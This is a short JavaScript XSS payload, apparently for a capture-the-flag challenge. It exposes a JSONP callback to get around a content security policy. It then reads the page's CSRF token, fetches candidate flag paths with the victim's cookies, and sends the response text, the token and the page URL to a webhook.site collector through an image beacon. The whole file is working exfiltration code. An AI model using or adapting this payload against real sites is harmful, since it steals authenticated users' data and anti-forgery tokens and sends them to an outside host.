// p.js  (ES5, CSP-safe)
(function () {
  // JSONP must call a valid identifier; we expose one on window:
  window.run = function () {
    var paths = ["/flag", "/flag.txt", "/admin/flag", "/api/flag"];

    // optional: try to grab a CSRF token from DOM
    var token = "";
    var s = document.querySelector('input[name=csrf_token],input[name=csrf-token]');
    if (s && s.value) token = s.value;
    var m = document.querySelector('meta[name=csrf-token]');
    if (!token && m && m.content) token = m.content;

    function exfil(text) {
      try {
        var i = new Image();
        i.referrerPolicy = "no-referrer";
        // ← your collector (HTTPS). Image beacons are allowed by: img-src https:
        i.src = "https://webhook.site/abc5b1d6-8272-4188-873e-5b98c81ed700"
              + "?d=" + encodeURIComponent(text.slice(0, 6000))
              + "&t=" + encodeURIComponent(token)
              + "&u=" + encodeURIComponent(location.href);
      } catch (e) {}
    }

    (function step(k) {
      if (k >= paths.length) return exfil("[no-flag]");
      fetch(paths[k], { credentials: "include" })
        .then(function (r) {
          if (!r.ok) return step(k + 1);
          return r.text().then(function (t) {
            if (t) exfil(t); else step(k + 1);
          });
        })
        .catch(function () { step(k + 1); });
    })(0);
  };
})();
